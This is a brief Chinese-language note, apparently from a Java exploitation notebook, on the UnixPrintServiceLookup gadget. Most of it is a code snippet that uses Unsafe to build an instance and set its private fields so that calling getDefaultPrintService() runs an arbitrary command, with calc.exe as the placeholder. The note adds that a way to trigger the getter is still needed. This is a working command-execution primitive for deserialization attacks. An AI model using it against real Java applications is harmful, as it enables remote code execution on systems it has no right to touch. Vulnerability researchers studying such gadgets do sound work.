# UnixPrintServiceLookup

## 利用方法1

可通过能够触发getter方法`getDefaultPrintService()`

利用方式：

```
        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);
        setFieldValue(unixPrintServiceLookup, "cmdIndex", 0);
        setFieldValue(unixPrintServiceLookup, "osname", "Pupi1");
        String cmd = "calc.exe";
        setFieldValue(unixPrintServiceLookup, "lpcFirstCom", new String[]{cmd, cmd, cmd});
```

需要想办法触发`Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);`的`getDefaultPrintService()`，也就是getter方法

